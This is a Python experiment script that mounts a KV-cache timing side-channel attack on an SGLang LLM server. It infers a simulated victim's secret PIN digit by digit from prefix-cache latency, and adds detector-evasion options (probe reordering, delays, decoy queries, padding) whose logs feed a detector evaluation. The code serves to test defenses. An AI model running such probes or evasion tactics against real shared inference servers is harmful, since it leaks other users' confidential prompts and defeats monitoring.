"""
adaptive_attacker.py — KV4 Section 2: adaptive attacker variants.
Built on experiments/sglang/run_level3.py's proven probe logic (same
send_request/resolve_salt calls, same PIN format) — adds: probe ordering
(fixed/random/adaptive), timing obfuscation (delay/benign-mix/rate-limit),
padding, and query-budget (candidate-set size restriction).
Logs 'prompt' + reconstructed cumulative 'timestamp' so this CSV is directly
consumable by evaluate_detector_v2.py (run_level3.py's raw output is not).
UNVERIFIED — smoke test with --trials 2 before any larger run.
"""
import csv, os, sys, argparse, random, string, time
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "sglang"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from measure import send_request
from apps.shared_client import resolve_salt, CACHE_MODES

PIN_LENGTH = 6
PIN_LABEL = "PIN: "
PIN_SEPARATOR = ","
PIN_TRAILING_MARKER = "."
FILLER = (
    "You are a customer support assistant for Acme Corp. Always be polite, "
    "concise, and professional. Never disclose internal policy details. "
    "Refer customers to the help center for billing questions. Escalate "
    "any security concerns to the security team immediately. Do not make "
    "promises about refund timelines. Respond only with OK."
)
TEMPLATE = "Confidential authorization code: {pin_str}. " + FILLER
DECOY_PROMPTS = [
    "What is the weather like today?",
    "Can you summarize our refund policy in one sentence?",
    "How do I update my billing address?",
]

def format_pin(digits):
    return PIN_LABEL + PIN_SEPARATOR.join(digits) + PIN_TRAILING_MARKER

def maybe_pad(prompt, pad_tokens):
    return prompt if pad_tokens <= 0 else prompt + " " + " ".join(["pad"] * pad_tokens)

def get_candidates(prior_variance, order_mode, budget):
    digits = list(string.digits)
    if order_mode == "random":
        random.shuffle(digits)
    elif order_mode == "adaptive" and prior_variance:
        digits = sorted(digits, key=lambda d: prior_variance.get(d, 0), reverse=True)
    if budget and budget < len(digits):
        digits = digits[:budget]
    return digits

def apply_timing(mode, clock_state):
    if mode == "delay":
        time.sleep(0.5)
    elif mode == "rate-limit":
        target = 1.0
        elapsed = time.perf_counter() - clock_state["last"]
        if elapsed < target:
            time.sleep(target - elapsed)
    clock_state["last"] = time.perf_counter()

def run(cache_mode, run_id, trials, out_path, probe_order, timing_mode, pad_tokens, query_budget):
    rows = []
    exact_matches = 0
    total_correct = 0
    cum_time = [0.0]
    clock_state = {"last": time.perf_counter()}
    prior_variance = {}

    print(f"=== Adaptive attacker: cache_mode={cache_mode} order={probe_order} "
          f"timing={timing_mode} pad={pad_tokens} budget={query_budget} ===")

    for trial in range(trials):
        gt_pin = "".join(random.choice(string.digits) for _ in range(PIN_LENGTH))
        salt_v = resolve_salt(cache_mode, "victim", run_id)
        victim_prompt = TEMPLATE.format(pin_str=format_pin(list(gt_pin)))
        rv = send_request(victim_prompt, cache_salt=salt_v)
        cum_time[0] += rv["wall_clock_latency"]
        rows.append({"framework": "sglang", "cache_mode": cache_mode, "trial": trial,
                      "role": "victim", "position": None, "probe_digit": None,
                      "wall_clock_latency": rv["wall_clock_latency"], "ground_truth_digit": None,
                      "position_guess": None, "position_correct": None,
                      "prompt": victim_prompt, "timestamp": cum_time[0], "is_decoy": False})

        if timing_mode == "benign-mix" and random.random() < 0.3:
            decoy = random.choice(DECOY_PROMPTS)
            rd = send_request(decoy)
            cum_time[0] += rd["wall_clock_latency"]
            rows.append({"framework": "sglang", "cache_mode": cache_mode, "trial": trial,
                         "role": "decoy", "position": None, "probe_digit": None,
                         "wall_clock_latency": rd["wall_clock_latency"], "ground_truth_digit": None,
                         "position_guess": None, "position_correct": None,
                         "prompt": decoy, "timestamp": cum_time[0], "is_decoy": True})

        inferred = []
        for pos in range(PIN_LENGTH):
            candidates = get_candidates(prior_variance, probe_order, query_budget)
            latencies = {}
            pos_rows = []
            for d in candidates:
                apply_timing(timing_mode, clock_state)
                digits = list(gt_pin)
                digits[pos] = d
                salt_a = resolve_salt(cache_mode, "attacker", run_id)
                probe_prompt = maybe_pad(TEMPLATE.format(pin_str=format_pin(digits)), pad_tokens)
                r = send_request(probe_prompt, cache_salt=salt_a)
                cum_time[0] += r["wall_clock_latency"]
                latencies[d] = r["wall_clock_latency"]
                pos_rows.append({"framework": "sglang", "cache_mode": cache_mode, "trial": trial,
                                 "role": "attacker", "position": pos, "probe_digit": d,
                                 "wall_clock_latency": r["wall_clock_latency"],
                                 "ground_truth_digit": gt_pin[pos], "position_guess": None,
                                 "position_correct": None, "prompt": probe_prompt,
                                 "timestamp": cum_time[0], "is_decoy": False})
            guess = min(latencies, key=latencies.get) if latencies else random.choice(string.digits)
            correct = (guess == gt_pin[pos])
            for row in pos_rows:
                row["position_guess"] = guess
                row["position_correct"] = correct
            rows.extend(pos_rows)
            inferred.append(guess)
            total_correct += int(correct)
            prior_variance[guess] = (max(latencies.values()) - min(latencies.values())) if latencies else 0

        inferred_pin = "".join(inferred)
        exact = (inferred_pin == gt_pin)
        exact_matches += int(exact)
        n_q = sum(1 for r in rows if r["trial"] == trial and r["role"] == "attacker")
        print(f"  trial={trial} gt={gt_pin} inferred={inferred_pin} exact_match={exact} queries_used={n_q}")

    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    fieldnames = ["framework", "cache_mode", "trial", "role", "position", "probe_digit",
                  "wall_clock_latency", "ground_truth_digit", "position_guess",
                  "position_correct", "prompt", "timestamp", "is_decoy"]
    with open(out_path, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=fieldnames)
        w.writeheader()
        w.writerows(rows)
    print(f"Saved {len(rows)} rows to {out_path}")
    print(f"Exact-match accuracy: {exact_matches}/{trials} trials")
    print(f"Per-digit accuracy: {total_correct}/{trials*PIN_LENGTH} positions")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--cache-mode", choices=sorted(CACHE_MODES), required=True)
    p.add_argument("--run-id", default=None)
    p.add_argument("--trials", type=int, default=30)
    p.add_argument("--out", required=True)
    p.add_argument("--probe-order", choices=["fixed", "random", "adaptive"], default="fixed")
    p.add_argument("--timing", choices=["none", "delay", "benign-mix", "rate-limit"], default="none")
    p.add_argument("--pad-tokens", type=int, default=0)
    p.add_argument("--query-budget", type=int, default=0)
    a = p.parse_args()
    run(a.cache_mode, a.run_id, a.trials, a.out, a.probe_order, a.timing, a.pad_tokens, a.query_budget)
